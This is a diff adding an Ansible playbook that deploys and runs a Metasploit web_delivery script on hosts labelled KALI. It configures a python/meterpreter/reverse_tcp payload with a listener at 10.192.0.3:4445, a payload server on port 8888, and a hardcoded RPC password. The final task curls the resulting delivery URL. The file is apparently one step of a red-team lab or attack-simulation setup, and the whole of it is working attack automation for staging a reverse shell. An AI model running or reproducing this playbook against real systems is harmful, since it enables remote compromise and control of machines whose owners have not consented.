@@ -1,0 +1,64 @@
+---
+- name: Deploy and Run Metasploit Web Delivery Script on KALI Hosts
+  hosts: KALI
+  gather_facts: no
+  become: yes
+  become_user: root
+  vars_files:
+      /etc/ansible/host_vars/vault_vars.yml
+  vars:
+    ansible_become_pass: '{{ become_p }}'
+  tasks:
+    - name: Wait host to come up
+      wait_for_connection:
+        timeout:  36000 # 10 hours
+        sleep: 5
+
+    - name: Gather facts
+      setup:
+
+    - name: Read the Metasploit URL and command from the file on the KALI hosts
+      command: cat /tmp/metasploit_details.txt
+      register: metasploit_details  
+
+    - name: Copy the Metasploit web_delivery Python script to the KALI hosts
+      copy:
+        src: files/attack/step1/msf-web-delivery.py
+        dest: /tmp/msf-web-delivery.py
+        mode: '0755'
+
+    - name: Run the Metasploit web_delivery Python script on the KALI hosts
+      command: python3 /tmp/msf-web-delivery.py --lhost {{ lhost }} --lport {{ lport }} --srvhost {{ srvhost }} --srvport {{ srvport }} --payload {{ payload }} --uripath {{ uripath }} --msf-password {{ msf_password }} --rpc-port {{ rpc_port }}
+      register: script_output
+      vars:
+        lhost: "10.192.0.3"
+        lport: "4445"
+        srvhost: "0.0.0.0"
+        srvport: "8888"
+        payload: "python/meterpreter/reverse_tcp"
+        uripath: "/mypayload"
+        msf_password: "msfrpc"
+        rpc_port: "55556"
+      become: yes
+      become_user: env-admin  # Replace with the specific username
+
+    - name: Ensure the URL file is created on the KALI hosts
+      stat:
+        path: /tmp/metasploit_details.txt
+      register: url_file_stat
+      until: url_file_stat.stat.exists
+      retries: 3
+      delay: 5
+
+    - name: Read the Metasploit URL and command from the file on the KALI hosts
+      command: cat /tmp/metasploit_details.txt
+      register: metasploit_details
+
+    - name: Display the Metasploit details
+      debug:
+        msg: "The Metasploit details on {{ inventory_hostname }} are:\n{{ metasploit_details.stdout }}"
+
+    # Example of using the URL (e.g., invoking it on a remote system)
+    - name: Execute the URL on the remote KALI hosts
+      shell: "curl {{ metasploit_details.stdout | regex_search('URL: (.*)') }}"
+      when: metasploit_details.stdout is defined
